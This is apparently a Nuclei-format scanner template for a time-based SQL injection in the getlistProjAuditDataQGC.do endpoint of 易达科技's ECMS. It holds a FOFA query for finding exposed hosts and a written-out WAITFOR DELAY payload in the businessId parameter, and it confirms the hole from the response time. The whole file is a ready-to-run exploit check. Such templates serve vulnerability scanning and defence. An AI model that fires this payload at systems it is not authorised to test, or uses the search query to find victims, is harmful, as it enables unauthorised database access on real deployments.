id: poc-yaml-gczj-ecms-getlistprojauditdataqgc-do-sqli
info:
  name: 易达科技-ECMS getlistProjAuditDataQGC.do SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sql-injection
  metadata:
    finger: ecms
    fofa: app="易达科技-ECMS"

variables:
  t1: "{{rand_int(5,10)}}"
  t2: "{{to_number(t1) + 2}}"

http:
  - raw:
      - |
        GET /procedure/getlistProjAuditDataQGC.do?projAudit.isOut=1&businessId=1' HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{}"
        part: body

  - raw:
      - |
        GET /procedure/getlistProjAuditDataQGC.do?projAudit.isOut=1&businessId=1%27WAITFOR%20DELAY%20%270:0:{{t1}}%27--&uesrId=1&costWorkId=1&flowId=1 HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "{\"rows\":[]}"
        part: body
      - type: dsl
        dsl:
          - "duration >= to_number(t1)"
          - "duration <= to_number(t2)"
